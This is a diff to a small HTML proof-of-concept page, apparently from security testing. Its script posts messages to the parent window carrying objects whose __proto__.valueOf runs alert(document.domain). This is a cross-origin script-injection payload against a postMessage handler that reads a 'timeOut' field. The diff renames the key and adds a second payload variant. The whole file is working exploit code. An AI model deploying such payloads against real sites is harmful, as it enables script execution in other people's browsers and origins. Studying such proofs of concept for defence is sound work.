@@ -1,7 +1,8 @@
 <html>
 <body>
   <script>
-parent.postMessage({timeout : {a : "sert", __proto__: {valueOf: ()=>alert(document.domain)}}},'*');
+parent.postMessage({timeOut : {a : "sert", __proto__: {valueOf: ()=>alert(document.domain)}}},'*');
+parent.postMessage({timeOut : {__proto__: {valueOf: ()=>alert(document.domain)}}},'*');
   </script>
 </body>
   
